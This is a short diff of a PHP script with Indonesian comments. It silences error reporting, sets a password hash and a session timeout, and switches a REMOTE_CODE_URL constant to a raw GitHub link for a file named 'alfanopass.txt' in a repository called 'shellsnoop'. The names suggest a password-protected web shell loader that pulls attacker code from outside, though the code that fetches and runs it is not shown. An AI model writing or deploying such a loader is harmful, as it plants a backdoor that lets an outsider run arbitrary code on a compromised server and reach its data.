@@ -11,7 +11,7 @@ error_reporting(0);
 // ====== Konfigurasi Utama ======
 define('ZPASSWORD_HASH', '$2y$10$POGWvpSABO4dZsol.Cm.rueYu9jnrN1qWeQ.wQN7To0lNWTRWqHli'); // password hash
 define('SESSION_TIMEOUT', 900); // 15 menit
-define('REMOTE_CODE_URL', 'https://github.com/callsnoop/shellsnoop/blob/main/danger-alfa.txt');
+define('REMOTE_CODE_URL', 'https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfanopass.txt');
 
 // ====== Keamanan Session ======
 if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > SESSION_TIMEOUT) {
